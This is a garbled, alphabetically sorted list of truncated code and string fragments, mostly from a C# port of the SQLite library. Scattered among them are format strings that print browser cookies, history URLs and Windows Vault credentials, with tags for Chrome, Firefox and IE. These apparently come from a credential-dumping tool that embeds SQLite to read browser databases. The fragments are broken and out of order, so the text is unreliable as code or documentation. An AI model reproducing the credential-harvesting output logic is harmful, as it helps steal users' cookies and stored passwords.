"static int sqlite3VdbeMemTranslate(Mem pMem, int desiredEnc){"
"static int sqlite3_config( int op,  sqlite3_mutex_methods ap )"
"static int sqlite3_config( int op, ref sqlite3_mutex_methods ap )"
"static int winDlClose(ref sqlite3_vfs vfs, object data) { return 0"
"static int winDlError(ref sqlite3_vfs vfs, int nByte, ref string zErrMsg) { return 0"
"static object winDlOpen(ref sqlite3_vfs vfs, string zFilename) { return null"
"static object winDlSym(ref sqlite3_vfs vfs, object data, string zSymbol) { return null"
"static string sqlite3Utf16to8(sqlite3 db, string z, int nByte){"
"static u32 pager_datahash(int nByte, unsigned char pData){"
"static void IOTRACE( string X, params object[] ap ) { if ( SQLite3IoTrace ) { printf( X, ap )"
"static void PAGERTRACE( string T, params object[] ap ) { }"
"static void REGISTER_TRACE( Vdbe p, int R, Mem M ) { }"
"static void TRACE(string X, params object[] ap) { if (sqlite3BtreeTrace)  printf(X, ap)"
"static void VdbeComment( Vdbe v, string zFormat, params object[] ap ) { }"
"static void VdbeNoopComment( Vdbe v, string zFormat, params object[] ap ) { }"
"static void WHERETRACE( string X, params object[] ap ) { }"
"static void assertParentIndex(MemPage pParent, int iIdx, Pgno iChild) { }"
"static void sqlite3IoTrace( string X, params object[] ap ) {  }"
"static void sqlite3MemRealloc(object pPrior, int nByte){ return 0"
"static void sqlite3_progress_handler (sqlite3 db,       int nOps, dxProgress xProgress, object pArg){}"
"status)(int,int"
"storeTypeInfo(apArg[i], 0)"
"storeTypeInfo(pX, 0)"
"string z = """""
"string z,"
"string zColumnName,    /"
"string zData,"
"string zDbName,        /"
"string zErrMsg = """""
"string zFunctionName,"
"string zSql,              /"
"string zSql,             /"
"string zTableName,     /"
"string zTail8 = """""
"t {1}"", url, title)"
"t {1}={2}"",host_key,name, cookie_value)"
"t, sLocal)"
"t, sNow)"
"tCredential   : {0}"", cred)"
"tIdentity     : {0}"", identity)"
"tLastModified : {0}"", System.DateTime.FromFileTimeUtc((long)lastModified))"
"tPacakgeSid  : {0}"", packageSid)"
"tResource     : {0}"", resource)"
"tVault Type   : {0}"", vaultType)"
"test_control)(int, ...)"
"time,"
"true, true, true, true, true, true, true, true, true, true, false, false, false, false, false, false,  /"
"true, true, true, true, true, true, true, true, true, true, true, false, false, false, false, false,  /"
"true, true, true, true, true, true, true, true, true, true, true, false, false, false, false, true,  /"
"tx, 0, sizeof(tx))"
"t{0}"", url)"
"u8 isWriteLock,   /"
"uTm,"
"unsigned int i, t"
"unsigned int lo, hi"
"updateVirtualTable( pParse, pTabList, pTab, pChanges, pRowidExpr, aXRef, pWhere )"
"upperBits, FILE_BEGIN )"
"v, pMem.r, v ).Length"
"va_arg(ap, sqlite3_mutex_methods"
"va_arg(ap, sqlite3_pcache_methods"
"val = sqlite3_value_text16( columnMem(pStmt,i) )"
"val"" by 10.0 to renormalize."
"val"" is a double such that 0.1 <= "
"val, then"
"value, sizeof( value ) )"
"winDlOpen(sqlite3_vfs pVfs, string zFilename){"
"winMutexAlloc,"
"winMutexEnd,"
"winMutexEnter,"
"winMutexFree,"
"winMutexHeld,"
"winMutexInit,"
"winMutexLeave,"
"winMutexTry,"
"x00"""
"x0020"", 3) != 0)//   """
"xBenignBegin)(void),"
"xCallback)(void pArg, sqlite3_int64 used,int N),"
"xCreate)(int szPage, int bPurgeable)"
"xFunc, "
"xUnlockNotify(aArg, nArg)"
"xml version=""1.0"" encoding=""utf-8"""
"xml version=""1.0"""
"xyz"" only"
"y, x, 8 )"
"yyStackOverflow(yypParser, yyminorunion)"
"yyStackOverflow(yypParser, yypMinor)"
"yyTracePrompt, p.yystksz)"
"yyTracePrompt,yyTokenName[yymajor])"
"yy_destructor(yypParser, (YYCODETYPE)yymajor,yyminorunion)"
"yy_destructor(yypParser,(YYCODETYPE)yymajor,yyminorunion)"
"yy_shift(yypParser,yyact,YYERRORSYMBOL,u2)"
"yy_syntax_error(yypParser,yymajor,yyminorunion)"
"yypParser.yystack[yypParser.yyidx].stateno,"
"z = findCell(pPage, j)"
"z = sqlite3_mprintf(""%s"", colv[i])"
"z, double"
"z, int n)"
"z, int n){"
"z, int n, int iOffset)"
"z, int n, int iOffset){"
"z, int n, int)"
"zAlloc[nSize], 0, EXPR_FULLSIZE - nSize )"
"zArg1,"
"zArg2 = sqlite3GetVTable(db, pTab)->pMod->zName"
"zArg2,"
"zBuf,            /"
"zBuf,      /"
"zBuf[n], cnt, sizeof(cnt))"
"zBuf[n], i, sizeof(i))"
"zBuf[n], pid, sizeof(pid))"
"zBuf[n], x, sizeof(x))"
"zCol = ""ROWID"""
"zCollSeq = ""BINARY"""
"zColumn,    /"
"zColumn,"
"zColumnName,    /"
"zCsr, zEnd, "
"zDBase, pTab->zName, zCol)"
"zDataType = ""INTEGER"""
"zDb,        /"
"zDb,"
"zDbName,        /"
"zDbName, int op, void"
"zDestName,                 /"
"zErrDyn = sqlite3DbStrDup(db, ""Invalid key value"")"
"zErrMsg = sqlite3MPrintf(db, ""no such table column: %s.%s"", zTableName,"
"zExternal = sqlite3ValueText(pTmp, SQLITE_UTF16NATIVE)"
"zFile,    /"
"zFilename,"
"zFilename8 = sqlite3ValueText(pVal, SQLITE_UTF8)"
"zFormat = ""vtable constructor did not declare schema: %s"""
"zFunc8 = sqlite3Utf16to8(db, zFunctionName, -1)"
"zFuncName, int nArg)"
"zFunctionName,"
"zIn, int nChar){"
"zKey, nKey)"
"zMaster, int)"
"zModuleName = sqlite3MPrintf(db, ""%s"", pTab->zName)"
"zMsg = sqlite3MAppendf(db, zMsg, ""%s VIRTUAL TABLE INDEX %d:%s"", zMsg,"
"zName,              /"
"zName,         /"
"zName, "
"zName, 0}"
"zName, int flags, int "
"zName, int nOut, char "
"zName, int syncDir)"
"zName, sqlite3_file"
"zName,"
"zName,0}"
"zOut[j], zRep, nRep)"
"zOut[j], zStr[i], nStr-i)"
"zP4, int N)"
"zP4,int)"
"zProc,    /"
"zSQL = sqlite3_mprintf(""INSERT INTO table VALUES(%Q)"", zText)"
"zSQL = sqlite3_mprintf(""INSERT INTO table VALUES('%q')"", zText)"
"zSql,       /"
"zSql,     /"
"zSql8 = sqlite3Utf16to8(db, zSql, nBytes)"
"zSql8 = sqlite3ValueText(pVal, SQLITE_UTF8)"
"zStmt[k], zType, len )"
"zStr[i], zPattern, nPattern) ){"
"zTab, char "
"zTable,     /"
"zTable,"
"zTableName,     /"
"zTemp[i], "",..."", 4 )"
"zTemp[i], "",nil"", 4 )"
"zTemp[i], pColl.zName, n "
"zText = ""It's a happy day!"""
"zType[i], 7))"
$(Platform)' == 'Debug
$(Platform)' == 'Release
%d AND rootpage=
'       Matches any sequence of zero or more characters.
'       Matches exactly one character.
' ) )
' ) zIndex 
' ){
' in the original SQL) then the Expr.iTable holds the index
' is not followed by
' is present.
' or '
' see in the SQL statement 
' variables seen in the SQL so far 
'' )
'' ) n
'' ) tokenType = TK_ILLEGAL
'' character in zText
'' character.
'' doubled.  %q 
'': break
'.  A
':     /
': break
': flag_alternateform = true
': flag_plussign = true
'a')          /
'b')          /
'b') ){       /
'l')          /
'r') ){             /
't') ){       /
't') ){    /
( ( (Bitmask)1 ) << x )
( ( 1 << (int)( i 
( (char
( (u8
( 1 << ( I 
( EP_Reduced 
( MEM_Dyn 
( MEM_Ephem 
( MEM_Int 
( MEM_Null 
( MEM_Real 
( MEM_TypeMask 
( MEM_Zero 
( PGHDR_DIRTY 
( SQLITE_OPEN_DELETEONCLOSE 
( db.flags 
( nPagePerSector - 1 ) ) 
( pCell
( pOut
( pWC.vmask )
( zIn
('a'<<8)
('e'<<16)
('h'<<16)
('l'<<16)
('n'<<8)
('o'<<16)
('o'<<8)
('u'<<8)
('x'<<8)
(((Mem 
(((i64)0x7fffffff)<<32))
(((u8
(((u8 
((STRUCTURE
((char
((i64)n)
((u8
() API] retain their values.
() routine returns.
() routines defined here.
() routines is always
() routines must be called after
() routines.
(--bufpt) = cset[longvalue % (ulong)_base]
(0x7f)
(0x7f<<14)
(0x7f<<15)
(0xff)
(1<<(I
(A))<=0x7f
(A)<(u8)0x80) 
(B)))
(Bitmask)0
(CollSeq
(I)])))
(MEM_Static
(MEM_Str
(MEM_TypeMask
(N_SORT_BUCKET) elements in
(P))!=0)
(P))==(P))
(SQLITE_IOCAP_ATOMIC
(SQLITE_OPEN_READWRITE
(bufpt
(char 
(chrome80
(db.nDb
(db.nExtension))
(desiredEnc==SQLITE_UTF8
(firefox
(h1>>6))
(h2>>6))
(h>>4))
(i64)10000
(i64)10000000
(i64)nBlob)
(iArg
(ii>>8)) ){
(int (
(int)(yymsp[0].minor.yy0.z-yymsp[-1].minor.yy0.z)
(int)pPager->nReserve)
(map[x]
(p->wantToLock==0 
(pKey.aColl[nCol])
(pRowid!=0))
(pTerm.eOperator-1))==null )
(pgno-pgptrmap-1))
(rT - 2440587.5) 
(res.nData
(sizeof(CollSeq
(sizeof(char
(sqlite3CtypeMap[(unsigned char)(x)]
(szPage>>8)) 
(u64
(u8 
(unsigned char 
(void
(void 
(void)sqlite3SafetyOff(db)
(void)sqlite3SafetyOff(pParse.db)
(void)sqlite3SafetyOn(db)
(void)sqlite3SafetyOn(pParse.db)
(x):(y))
(x==1)
(yyact = yy_find_reduce_action(
(zIn
(zType[6] 
)                       /
)        /
)     /
) =  sqlite3GlobalConfig.m
) =  sqlite3GlobalConfig.mutex
) = 0
) = et_getdigit(
) = sqlite3GlobalConfig.mutex
) = sqlite3GlobalConfig.pcache
) == 0)
) > 1) 
) FROM <tbl>
) FROM tab GROUP BY random()%5
) FROM tab GROUP BY x
) aggregate 
) and made
) and made available
) and when the total count can be
) are internally consistent.
) bytes of
) bytes of the page should be zeroed before 
) function.  The result is the version
) loop
) loop the loops through opcodes 
) macro. The type is
) pragmas
) sqlite3GlobalConfig.pPage)
) sqlite3GlobalConfig.pScratch)
) sqlite3GlobalConfig.pScratch)[i]
) that
) that uses the shared
) { sCheck.anRef[i] = 0
)( ( (u8
)(((char
)(DbPage
)(Mem
)(PGHDR1_TO_PAGE(pPage)) = 0
)(ROUND8(sizeof(
)(X) - (char
)(X))
)(X)).
)(intptr_t)(X))
)(pIndex->aiColumn[nCol])
)(pIndex->aiRowEst[nCol
)(pIndex->azColl[nCol])
)(pIndex[1])
)(pPtr 
)(pPtr)
)(size_t))
)(size_t))sqlite3Malloc)
)(sqlite3
)(sqlite3_context
)(sqlite3_vtab 
)(void
)(void 
)(void))
)(x)]==   
)(y)]     
)) = pAccum.nChar
))((char 
))(void)
))>=0xc0 ){                              
)-1. For min() it
). If the requested reference is
). The pager is always 'purgeable' (not an in-memory
)0 ) 
)0) 
)0))
)0)->FIELD))
)0).zMalloc))
)0)[X])
)0)[X]) construct.  But MSVC chokes on ((void
)<<8)
)X)-(char
)mem0.aScratchFree ){
)misuse
)outOfMem
)p )[ROUND8( sizeof( UnpackedRecord ) )]
)p )[sz]
)p - (u8
)p) 
)p) - p->pCache->szPage)
)p->pModule 
)p->pStmt
)p.aVar[nVar]
)p.apArg[nArg]
)p.azVar[nVar]
)pArray
)pBlob
)pBtree.pBt.pSchema
)pBuf
)pBuf)[sz]
)pBuf)[wrote]
)pJfd
)pKey)[nBytes]))
)pMaster ) 
)pMem.z
)pMem.z) 
)pMod)
)pOut.z
)pPage )[sizeof( PgHdr ) 
)pPage.pData)
)pParse->sArg.z
)pPg->pData)[24]
)pPrior
)pSpace
)pStart
)pTab->azModuleArg
)pVtab->pModule
)pVtab.pModule
)pp ) == 0 )
)pp = (void
)sqlite3GlobalConfig.pScratch)
)sqlite3HashFind(
)sqlite3HashInsert(
)sqlite3Malloc( new_size
)sqlite3Malloc( sizeof(HashElem) )
)sqlite3Malloc(nArg
)sqlite3Malloc(pIdx->nColumn
)sqlite3MallocZero(
)sqlite3MallocZero( pVfs.szOsFile 
)sqlite3MallocZero(Schema).Length
)sqlite3MallocZero(sizeof(BtLock))
)sqlite3MallocZero(sizeof(Pgno)
)sqlite3Realloc(
)sqlite3_malloc( sizeof( PCache1 ) )
)sqlite3_malloc( sizeof( PgHdr1
)sqlite3_user_data(context)
)sqlite3_value_blob(argv[2])
)sqlite3_value_text(argv[0])
)sqlite3_wsd_find((void
)sqliteHashData(i)
)sqliteHashData(p)
)z ) ) z
)zAlloc
)zConverted
)zConverted )
)zConverted)
)zCsr
)zDate ) ) { zDate
)zIn)
)zLeft
)zLowerName
)zNum) ) zNum
)zOut
)zRight
)zSql 
){ assert( zNum[i]>='0' 
){ if( azResult[i] ) //sqlite3_free(azResult[i])
){ mem0.aScratchFree[i] = i
- Chrome
- IE 
- system
-)HH:MM:SS.FFF adds (or subtracts) the
-- by sqlite3WhereBegin()
-- by sqlite3WhereEnd()
----------------
-----.  SELECT a FROM t1
----.  SELECT b FROM t2
-SQLite
-SQLite is an independent reimplementation of the SQLite software library
. This is done
...]     Matches one character not in the enclosed list.
.Length
.Length 
.Length == sizeof(i64)
.Length == sizeof(long)
.c files
.c files only.  It is not a
.c) and is 
.net2 
/  ( db.flags 
/  OP_SeekGe
/  i < zSql.Length )
/ ( flags 
/ ) 
/ ) )
/ ) goto exit_create_index
/ ) return
/ ) return 0
/ ) return WRC_Abort
/ ){
/ // Needs to be u8 for later tests
/ //yytestcase( yyruleno == 285 )
/ //yytestcase(yyruleno==100)
/ //yytestcase(yyruleno==103)
/ //yytestcase(yyruleno==107)
/ //yytestcase(yyruleno==108)
/ //yytestcase(yyruleno==114)
/ //yytestcase(yyruleno==116)
/ //yytestcase(yyruleno==118)
/ //yytestcase(yyruleno==119)
/ //yytestcase(yyruleno==120)
/ //yytestcase(yyruleno==126)
/ //yytestcase(yyruleno==127)
/ //yytestcase(yyruleno==137)
/ //yytestcase(yyruleno==145)
/ //yytestcase(yyruleno==146)
/ //yytestcase(yyruleno==15)
/ //yytestcase(yyruleno==150)
/ //yytestcase(yyruleno==154)
/ //yytestcase(yyruleno==157)
/ //yytestcase(yyruleno==158)
/ //yytestcase(yyruleno==159)
/ //yytestcase(yyruleno==16)
/ //yytestcase(yyruleno==160)
/ //yytestcase(yyruleno==161)
/ //yytestcase(yyruleno==167)
/ //yytestcase(yyruleno==168)
/ //yytestcase(yyruleno==179)
/ //yytestcase(yyruleno==18)
/ //yytestcase(yyruleno==180)
/ //yytestcase(yyruleno==187)
/ //yytestcase(yyruleno==190)
/ //yytestcase(yyruleno==191)
/ //yytestcase(yyruleno==200)
/ //yytestcase(yyruleno==201)
/ //yytestcase(yyruleno==202)
/ //yytestcase(yyruleno==203)
/ //yytestcase(yyruleno==204)
/ //yytestcase(yyruleno==205)
/ //yytestcase(yyruleno==206)
/ //yytestcase(yyruleno==209)
/ //yytestcase(yyruleno==210)
/ //yytestcase(yyruleno==211)
/ //yytestcase(yyruleno==219)
/ //yytestcase(yyruleno==222)
/ //yytestcase(yyruleno==223)
/ //yytestcase(yyruleno==225)
/ //yytestcase(yyruleno==226)
/ //yytestcase(yyruleno==235)
/ //yytestcase(yyruleno==236)
/ //yytestcase(yyruleno==237)
/ //yytestcase(yyruleno==238)
/ //yytestcase(yyruleno==239)
/ //yytestcase(yyruleno==240)
/ //yytestcase(yyruleno==241)
/ //yytestcase(yyruleno==242)
/ //yytestcase(yyruleno==246)
/ //yytestcase(yyruleno==247)
/ //yytestcase(yyruleno==251)
/ //yytestcase(yyruleno==254)
/ //yytestcase(yyruleno==260)
/ //yytestcase(yyruleno==261)
/ //yytestcase(yyruleno==262)
/ //yytestcase(yyruleno==263)
/ //yytestcase(yyruleno==264)
/ //yytestcase(yyruleno==265)
/ //yytestcase(yyruleno==266)
/ //yytestcase(yyruleno==267)
/ //yytestcase(yyruleno==275)
/ //yytestcase(yyruleno==277)
/ //yytestcase(yyruleno==298)
/ //yytestcase(yyruleno==30)
/ //yytestcase(yyruleno==303)
/ //yytestcase(yyruleno==304)
/ //yytestcase(yyruleno==31)
/ //yytestcase(yyruleno==324)
/ //yytestcase(yyruleno==325)
/ //yytestcase(yyruleno==39)
/ //yytestcase(yyruleno==40)
/ //yytestcase(yyruleno==41)
/ //yytestcase(yyruleno==42)
/ //yytestcase(yyruleno==43)
/ //yytestcase(yyruleno==46)
/ //yytestcase(yyruleno==49)
/ //yytestcase(yyruleno==59)
/ //yytestcase(yyruleno==70)
/ //yytestcase(yyruleno==71)
/ //yytestcase(yyruleno==83)
/ //yytestcase(yyruleno==84)
/ //yytestcase(yyruleno==85)
/ //yytestcase(yyruleno==86)
/ //yytestcase(yyruleno==97)
/ //yytestcase(yyruleno==98)
/ IN_DECLARE_VTAB )
/ db.mallocFailed != 0 )
/ i <= p.pEList.nExpr 
/ pItem.pExpr == pSpan.pExpr )
/ pParse.nErr > 0
/ rc == SQLITE_IOERR_NOMEM )
/-)HH:MM
/-HH:MM
/-HH:MM is always optional.  The fractional
//  
//    
//      
//            (void)sqlite3SafetyOff(db)
//            goto blob_open_out
//            rc = SQLITE_ERROR
//            sqlite3BtreeLeaveAll(db)
//          for(x=sqliteHashFirst(pTbls)
//          if( pIdx.aiColumn[j]==iCol ){
//          memcpy(
//          type==0
//          u8 
//          }
//        break
//        db.mallocFailed = 1
//        db.mallocFailed = malloc_failed
//        for(j=0
//        if ( db.mallocFailed != 0 ) return 1
//        if ( rc == SQLITE_NOMEM ) db.mallocFailed = 1
//        int j
//        pParse->zErrMsg = 0
//        wsdAutoext.aExt = aNew
//        zErr = pParse->zErrMsg
//        }
//       (pParse.nAlias-pParse.nAliasAlloc)
//      (void)sqlite3SafetyOff(db)
//      )
//      /
//      Build Number
//      Index pIdx
//      Major Version
//      Minor Version 
//      Revision
//      db.errCode = rc
//      flags = !!flags
//      for(pIdx=pTab.pIndex
//      goto blob_open_out
//      if ( acc.mallocFailed != 0 )
//      if ( db.mallocFailed != 0 ) goto drop_trigger_cleanup
//      if ( db.mallocFailed != 0 ) goto exit_begin_add_column
//      if ( db.mallocFailed != 0 ) goto trigger_cleanup
//      if ( db.mallocFailed != 0 ) return
//      if( pParse->zErrMsg ){
//      if( sParse.zErrMsg ){
//      nAttempt
//      p.pStmt = null
//      pTab = 0
//      rc = SQLITE_ERROR
//      rc = sqlite3_finalize((sqlite3_stmt 
//      sqlite3BtreeLeaveAll(db)
//      sqlite3ParserARG_STORE
//      sqlite3VdbeFinalize(v)
//      v = 0
//      v.rc = rc
//      {
//      }
//    /
//    Debug.Assert( db == v.db )
//    Debug.Assert( desiredEnc==SQLITE_UTF16BE )
//    Debug.Assert( rc==SQLITE_NOMEM )
//    Incrblob pBlob
//    SQLITE_INT_TO_PTR(nConstraint)
//    TESTONLY(int rc
//    assertCellInfo(pCur)
//    db = p->db
//    for(iCol=0
//    gmtime_r(
//    goto blob_open_out
//    if( NEVER(rc!=SQLITE_OK) /
//    if( db.mallocFailed !=0{
//    if( flags ){
//    if( iCol==pTab.nCol ){
//    if( null==pTab ){
//    if( pTab 
//    if( rc!=SQLITE_ROW ){
//    if( rc==SQLITE_ABORT ){
//    if( type<12 ){
//    if( v ){
//    int iPage = pCur.iPage
//    m.z = 0
//    pBlob = (Incrblob 
//    pBlob.db = db
//    pBlob.flags = flags
//    pBlob.iOffset = v.apCsr[0].aOffset[iCol]
//    pBlob.nByte = sqlite3VdbeSerialTypeLen(type)
//    pBlob.pCsr =  v.apCsr[0].pCursor
//    pBlob.pStmt = (sqlite3_stmt 
//    pCur.validNKey = true
//    pParse->db = db
//    pTm = gmtime(
//    ppBlob = (sqlite3_blob 
//    rc = SQLITE_ABORT
//    rc = SQLITE_ERROR
//    rc = SQLITE_NOMEM
//    rc = SQLITE_OK
//    rc = sqlite3SafetyOff(db)
//    rc = sqlite3_finalize(p->pStmt)
//    rc = sqlite3_step((sqlite3_stmt 
//    return SQLITE_NOMEM
//    sqlite3BtreeCacheOverflow(pBlob.pCsr)
//    sqlite3BtreeEnterAll(db)
//    sqlite3BtreeEnterCursor(p.pCsr)
//    sqlite3BtreeEnterCursor(pBlob.pCsr)
//    sqlite3BtreeLeaveAll(db)
//    sqlite3BtreeLeaveCursor(p.pCsr)
//    sqlite3BtreeLeaveCursor(pBlob.pCsr)
//    sqlite3VdbeFinalize(v)
//    sqlite3VdbeMemRelease(
//    sqlite3_bind_int64((sqlite3_stmt 
//    sqlite3_mutex_enter(db->mutex)
//    sqlite3_mutex_enter(sqlite3MutexAlloc(SQLITE_MUTEX_STATIC_MASTER))
//    sqlite3_mutex_leave(db->mutex)
//    sqlite3_mutex_leave(sqlite3MutexAlloc(SQLITE_MUTEX_STATIC_MASTER))
//    struct tm pTm
//    struct tm sNow
//    temp = 
//    u32 i[2]
//    u32 type = v.apCsr[0].aType[iCol]
//    u64 r
//    v = (Vdbe
//    v = sqlite3VdbeCreate(db)
//    while( zIn<zTerm ){
//    zIn
//    }
//    }else{
//  $Header$
//  /
//  //sqlite3_free_table(ref res.azResult[1])
//  : 1
//  : 31
//  Debug.Assert( (m.flags 
//  Debug.Assert( 0==db.mallocFailed )
//  Debug.Assert( desiredEnc==SQLITE_UTF8 )
//  Debug.Assert( sqlite3_mutex_held(pCtx.s.db.mutex) )
//  Incrblob 
//  Incrblob p = (Incrblob 
//  Parse 
//  SQLITE_SKIP_UTF8(z)
//  TESTONLY( Pgno iLastPg = pagerPagecount(pBt)
//  Table 
//  Vdbe 
//  aSpace1 = (u8
//  assert( ppStmt 
//  char
//  char 
//  columnMallocFailure(pStmt)
//  const char 
//  const void 
//  db = p->db
//  db.errCode = SQLITE_NOMEM
//  db.pCollNeededArg = pCollNeededArg
//  db.xCollNeeded = 0
//  db.xCollNeeded16 = xCollNeeded16
//  do {
//  goto translate_out
//  if( !db->mallocFailed ){
//  if( db.mallocFailed !=0{
//  if( desiredEnc==SQLITE_UTF16LE ){
//  if( p ){
//  if( p==0 ) return SQLITE_MISUSE
//  if( pCur.info.nSize==null ){                                                   
//  if( pMem->enc==SQLITE_UTF16LE ){
//  if( pParse==0 ){
//  if( rc!=SQLITE_OK ){
//  if( rc==SQLITE_ROW ){
//  if( v 
//  if( zName8 ){
//  int 
//  int (
//  int iCol
//  int iDb
//  int iTab
//  int nAttempt = 0
//  int rc
//  int rc = SQLITE_OK
//  int sqlite3JournalCreate(sqlite3_file 
//  int sqlite3JournalOpen(sqlite3_vfs 
//  int sqlite3JournalSize(sqlite3_vfs 
//  int sqlite3MutexEnd(void)
//  int sqlite3MutexInit(void)
//  int sqlite3VdbeMemExpandBlob(Mem 
//  int(
//  k 
//  m.db = db
//  memset(
//  p = sqlite3Malloc(nByte)
//  pCtx.isError = SQLITE_ERROR
//  pMem->enc = desiredEnc
//  pMem->n = (int)(z - zOut)
//  pzTail = (u8 
//  rc = SQLITE_ERROR
//  rc = sqlite3VdbeMemMakeWriteable(pMem)
//  return SQLITE_MISUSE
//  return SQLITE_NOMEM
//  return SQLITE_OK
//  return columnName(
//  return p 
//  return rc
//  return u.r
//  return val
//  sqlite3
//  sqlite3 
//  sqlite3 db
//  sqlite3VdbeChangeEncoding(
//  sqlite3VdbeMemSetStr(
//  sqlite3_blob 
//  sqlite3_context 
//  sqlite3_mutex 
//  sqlite3_mutex_enter(db.mutex)
//  sqlite3_mutex_leave(db->mutex)
//  sqlite3_mutex_leave(db.mutex)
//  sqlite3_mutex_methods 
//  sqlite3_value[] argv
//  static const VdbeOpList openBlob[] = {
//  string zName
//  t = u.i[0]
//  t = x.iJD/1000 - 21086676
//  u.i[0] = u.i[1]
//  u.i[1] = t
//  u.r = in
//  u32 t
//  u8 b1 = 
//  u8 b2 = 
//  u8 isWriteLock
//  u8 temp
//  union {
//  va_list ap
//  void
//  void 
//  void sqlite3VdbeIOTraceSql(Vdbe)
//  void(
//  while( zIn<zTerm ){
//  zBuf[N] = randomu8()
//  zIn = (u8
//  zTerm = 
//  {
//  }
//  } u
//  } while( nAttempt<5 
//  }else if( rc==SQLITE_OK ){
//  }else{
//  }else{                                                                       
// != INVALID_FILE_ATTRIBUTES
// ( m.flags 
// ( sqlite3PagerGetExtra( pDestPg ) )[0] = 0
// (BtCursor
// (Column
// (Expr
// (KeyInfo
// (Mem
// (PCache1
// (PgFreeslot)p
// (PgFreeslot)pBuf
// (PgHdr1
// (Table
// (Trigger
// (VdbeCursor
// (WhereClause )((u8 )pWInfo)[nByteWInfo]
// (char
// (char 
// (i64)( (((u64)0x7fffffff)<<32) 
// (sqlite3_backup)sqlite3_malloc( sizeof( sqlite3_backup ) )
// (sqlite3_file
// (u32
// (u8
// (u8 
// (void
// -2
// = (char
// = a
// = p.aOp[p.nOp-1].zComment
// = pAggInfo.aFunc
// = pGB.a
// = pNew.u.zToken = (char
// = pParent.aOvfl[0].pCell
// = pSrcList.a
// = pTab.aCol
// = {0}
// ADDR(p2)
// CREATE_NEW
// ENC( pParse.db )
// ENC(db)
// ENC(pParse.db)
// FILE_SHARE_READ 
// General Information about an assembly is controlled through the following 
// GetFileAttributesW( (WCHAR
// GetVarint( aKey 
// Minimum Size = (2 bytes of Header  or (4) Child Pointer) 
// No used in C
// OPEN_ALWAYS
// QueryPerformanceCounter(out i)
// SQLITE_INT_TO_PTR( regIdxKey )
// Setting ComVisible to false makes the types in this assembly not visible 
// Success
// The following GUID is for the ID of the typelib if this project is exposed to COM
// Version information for an assembly consists of the following four values:
// associated with an assembly.
// azCols[nCol]
// char
// cnt.Length
// convertUtf8Filename( zUtf8Name )
// db.aDb = db.aDbStatic
// freeProc(ref pParser)
// len
// memcpy(
// memcpy( 
// memset(
// memset( 
// pC = c 
// pInfo.aColl[nExpr]
// pIter 
// pLItem
// pNew
// pOp[-1].p4.pColl
// pPager.pTmpSpace )
// pPayload 
// pSrc 
// r.aMem = p.aMem[pOp.p3]
// set of attributes. Change these attribute values to modify the information
// sizeof( PgHdr )
// sizeof(pid)
// sizeof(x)
// sqlite3IsNumericAffinity(idx_affinity)
// sqlite3Malloc( nPathname 
// sqlite3Malloc(pC.nData 
// sqlite3MallocZero(pPager.dbSize / 8 
// sqlite3Strlen30(bufpt)
// sqlite3ValueFree(pVal)
// sqlite3ValueFree(ref (sqlite3_value)p4)
// sqlite3_free( ref pBt.pSchema )
// sqlite3_free( ref pCellKey )
// sqlite3_free( ref sCheck.anRef )
// sqlite3_malloc( ( sz 
// sqlite3_malloc( BITVEC_SZ )
// sqlite3_malloc( sizeof( FileChunk ) )
// sqlite3_malloc( sizeof( char
// sqliteHashData( i )
// sqliteHashData( k )
// sqliteHashData( p )
// sqliteHashData( pElem )
// sqliteHashData( x )
// sqliteHashData(i)
// to COM components.  If you need to access a type in this assembly from 
// u8 pSpace = sqlite3PageMalloc( pCur.pBt.pageSize )
// while ( sqlite3Isspace( 
// z
// z2
// zBuf[k
// zData[len]
// zData[szHdr]
// zDate
// zDate 
// zOut 
// zTab = 
// zTemp[i
// z[zIndex] == 0
//( ( ( i64 ) - 1 ) - LARGEST_INT64 )
//( 0xffffffff 
//( SQLITE_TEMP_FILE_PREFIX.Length 
//(HashElem
//(PCache
//(Pager
//(UnpackedRecord
//(char
//(charMap(z[iOffset
//(int 
//(int)(1024/sizeof(Op)))
//(int)(sizeof(pPage.aOvfl)/sizeof(pPage.aOvfl[0])) )
//(int)(yy_action.Length/sizeof(yy_action[0]))
//(memcpy(
//(sqlite3_file
//(sqlite3_value_text(argv[0])
//(u16
//(u8
//(u8 
//(unsigned 
//)(sqlite3
//)(sqlite3_context
//)(void
//)(void 
//){
//---------------------WIN32 Definitions
////        db.mallocFailed = 1
//////        db.mallocFailed = 1
//= pList.a
//Alarms
//DWORD cnt = GetTickCount()
//DWORD pid = GetCurrentProcessId()
//Debug.Assert( (offset-c)<JOURNAL_HDR_SZ(pPager) )
//Debug.Assert( (pMem->n
//Debug.Assert( azResult!=0 )
//Debug.Assert( sizeof(r1)==sizeof(t2) 
//Debug.Assert( sizeof(res.azResult[0])>= sizeof(res.nData) )
//Debug.Assert(pOp > p.aOp)
//Debug.Assert(pOp[-1].opcode == OP_CollSeq)
//Debug.Assert(pOp[-1].p4type == P4_COLLSEQ)
//Expr 
//Expr pWhere         /
//Mem
//OPEN_EXISTING
//PAGER_MJ_PGNO(pPager) )
//PGHDR1_TO_PAGE( p )
//Right
//SQLITE_API SQLITE_DEPRECATED int sqlite3_aggregate_count(sqlite3_context
//SQLITE_API SQLITE_DEPRECATED int sqlite3_expired(sqlite3_stmt
//SQLITE_API SQLITE_DEPRECATED int sqlite3_global_recover(void)
//SQLITE_API SQLITE_DEPRECATED int sqlite3_memory_alarm(void(
//SQLITE_API SQLITE_DEPRECATED int sqlite3_transfer_bindings(sqlite3_stmt
//SQLITE_API SQLITE_DEPRECATED void sqlite3_thread_cleanup(void)
//SQLITE_EXTERN void (
//TESTONLY( int balance_deeper_called = 0 )
//TESTONLY( int balance_quick_called = 0 )
//TESTONLY(rc = ) btreeInitPage(pTo)
//VdbeFunc
//[100]
//[30]
//[etBUFSIZE-1]
//apCell = sqlite3ScratchMalloc( szScratch )
//apCell[nCell] = pTemp 
//atoi((char
//azResult--
//blob_open_out:
//bufpt = zExtra = sqlite3Malloc(n)
//char 
//char aSpace[150]
//char aTempRec[ROUND8(sizeof(UnpackedRecord)) 
//char zErr[100]
//char z[1000]
//const char 
//const char sqlite3IsEbcdicIdChar[] = {
//const int sqlite3one = 1
//const unsigned char ebcdicToAscii[] = {
//const void 
//ctx.pColl = pOp[-1].p4.pColl
//db.aDb = aNew
//extern const char sqlite3IsEbcdicIdChar[]
//for(i=0
//for(i=1
//for(j=0
//free(pParser.yystack)
//if( !zOut ){
//if( azNew==null ){
//if( n<0 
//if( pMem->enc!=SQLITE_UTF8 
//if( pMem->enc==SQLITE_UTF8 ){
//if( pNew !=null){
//if( sqlite3Isspace(z[i]) ){
//if( sqlite3SafetyOn(db) ){
//if( z==0 ) goto malloc_failed
